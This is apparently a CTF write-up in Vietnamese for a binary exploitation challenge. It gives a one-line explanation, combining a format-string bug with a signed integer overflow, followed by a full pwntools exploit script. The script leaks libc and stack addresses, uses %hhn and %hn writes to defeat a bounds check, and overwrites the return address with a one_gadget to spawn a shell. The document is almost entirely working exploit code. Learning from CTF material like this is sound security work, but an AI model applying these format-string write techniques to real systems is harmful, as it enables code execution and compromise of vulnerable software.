- chall này thật sự khá hay và lạ, kết hợp giữa FMT và IOF để bypass qua hàm if(v5 > 1) bằng cách set v5 = 0x80000001, mà v5 là int nó sẽ cho rằng v5 là số âm
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process([exe.path])
gdb.attach(p, gdbscript = '''
b*vuln+117
c
''')

input()

p.sendline(b'1')
p.recvuntil(b'Have this: ')
libc_leak = int(p.recv(14), 16)
libc.address = libc_leak - 0x81600
print(hex(libc_leak))
print(hex(libc.address))

p.sendline(b'2')
payload = b"%18$s"
p.sendlineafter(b'>> ', payload)
p.recvuntil(b'>> ')
stack = u64(p.recv(6) + b'\0\0')
print(hex(stack))
idx = stack - 0x114
rip = stack + 0x60 - 0xc0

p.sendline(b'2')
payload = f'%{0x80}c%8$hhn'.encode()
payload = payload.ljust(0x10)
payload += p64(idx + 3)
p.sendline(payload)

# 0x54ed3 0x11060a 0x110612 0x110617

one_gadet = libc.address + 0x54ed3
print(hex(one_gadet))
for i in range(2):
    payload = f'%{one_gadet & 0xffff}c%8$hn'.encode()
    payload = payload.ljust(0x10)
    payload += p64(rip + i * 2)
    p.sendline(b'2')
    p.sendline(payload)
    one_gadet = one_gadet >> 16
    print(hex(one_gadet))


p.interactive()
```
